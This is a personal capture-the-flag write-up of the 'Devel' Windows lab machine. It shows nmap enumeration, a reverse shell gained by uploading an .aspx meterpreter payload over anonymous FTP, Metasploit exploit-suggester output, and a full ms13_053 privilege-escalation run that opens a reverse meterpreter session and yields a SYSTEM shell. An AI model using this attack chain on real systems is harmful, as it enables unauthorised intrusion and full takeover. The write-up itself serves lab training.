# Devel
> Silver Garcia

## Enumeration
Nmap
```bash
└─$ sudo nmap -T4 -sC -p- 10.10.10.5
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-29 13:51 EDT
Nmap scan report for 10.10.10.5
Host is up (0.13s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE
21/tcp open  ftp
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  01:06AM       <DIR>          aspnet_client
| 03-17-17  04:37PM                  689 iisstart.htm
|_03-17-17  04:37PM               184946 welcome.png
80/tcp open  http
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS7
```

Website is hosted on FTP folder

Got reverse shell by uploading .apsx meterpreter and executing it.

## Privileg escalation
Exploit suggester
```bash
#   Name                                                           Potentially Vulnerable?  Check Result
-   ----                                                           -----------------------  ------------
1   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
2   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   Yes                      The service is running, but could not be validated. Vulnerable Windows 7/Windows Server 2008 R2 build detected!                                                                                                              
3   exploit/windows/local/ms10_015_kitrap0d                        Yes                      The service is running, but could not be validated.
4   exploit/windows/local/ms10_092_schelevator                     Yes                      The service is running, but could not be validated.
5   exploit/windows/local/ms13_053_schlamperei                     Yes                      The target appears to be vulnerable.
6   exploit/windows/local/ms13_081_track_popup_menu                Yes                      The target appears to be vulnerable.
7   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
8   exploit/windows/local/ms15_004_tswbproxy                       Yes                      The service is running, but could not be validated.
9   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
10  exploit/windows/local/ms16_016_webdav                          Yes                      The service is running, but could not be validated.
11  exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
12  exploit/windows/local/ms16_075_reflection                      Yes                      The target appears to be vulnerable.
13  exploit/windows/local/ms16_075_reflection_juicy                Yes                      The target appears to be vulnerable.
14  exploit/windows/local/ntusermndragover                         Yes                      The target appears to be vulnerable.
15  exploit/windows/local/ppr_flatten_rec                          Yes                      The target appears to be vulnerable.
```

Services running
```
SERVICE_NAME: AeLookupSvc
SERVICE_NAME: AppHostSvc
SERVICE_NAME: AudioEndpointBuilder
SERVICE_NAME: Audiosrv
SERVICE_NAME: BFE
SERVICE_NAME: COMSysApp
SERVICE_NAME: CryptSvc
SERVICE_NAME: CscService
SERVICE_NAME: DcomLaunch
SERVICE_NAME: defragsvc
SERVICE_NAME: Dhcp
SERVICE_NAME: Dnscache
SERVICE_NAME: DPS
SERVICE_NAME: eventlog
SERVICE_NAME: EventSystem
SERVICE_NAME: FDResPub
SERVICE_NAME: ftpsvc
SERVICE_NAME: gpsvc
SERVICE_NAME: iphlpsvc
SERVICE_NAME: LanmanServer
SERVICE_NAME: LanmanWorkstation
SERVICE_NAME: lmhosts
SERVICE_NAME: MpsSvc
SERVICE_NAME: MSDTC
SERVICE_NAME: netprofm
SERVICE_NAME: NlaSvc
SERVICE_NAME: nsi
SERVICE_NAME: PlugPlay
SERVICE_NAME: Power
SERVICE_NAME: ProfSvc
SERVICE_NAME: RpcEptMapper
SERVICE_NAME: RpcSs
SERVICE_NAME: SamSs
SERVICE_NAME: Schedule
SERVICE_NAME: SENS
SERVICE_NAME: Spooler
SERVICE_NAME: sppsvc
SERVICE_NAME: SysMain
SERVICE_NAME: Themes
SERVICE_NAME: TrkWks
SERVICE_NAME: UxSms
SERVICE_NAME: VGAuthService
SERVICE_NAME: VMTools
SERVICE_NAME: W32Time
SERVICE_NAME: W3SVC
SERVICE_NAME: WAS
SERVICE_NAME: WdiServiceHost
SERVICE_NAME: WdiSystemHost
SERVICE_NAME: WinDefend
SERVICE_NAME: Winmgmt
SERVICE_NAME: wscsvc
SERVICE_NAME: WSearch
SERVICE_NAME: wuauserv
```

**Got System privieleges with following exploit:**
exploit/windows/local/ms13_053_schlamperei
```bash
msf6 exploit(windows/local/ms13_053_schlamperei) > exploit

[*] Started reverse TCP handler on 10.10.14.43:4444 
[*] Launching notepad to host the exploit...
[+] Process 1776 launched.
[*] Reflectively injecting the exploit DLL into 1776...
[*] Injecting exploit into 1776...
[*] Found winlogon.exe with PID 444
[+] Everything seems to have worked, cross your fingers and wait for a SYSTEM shell
[*] Sending stage (176198 bytes) to 10.10.10.5
[*] Meterpreter session 2 opened (10.10.14.43:4444 -> 10.10.10.5:49198) at 2024-03-31 11:09:26 -0400

meterpreter > shell
Process 3408 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

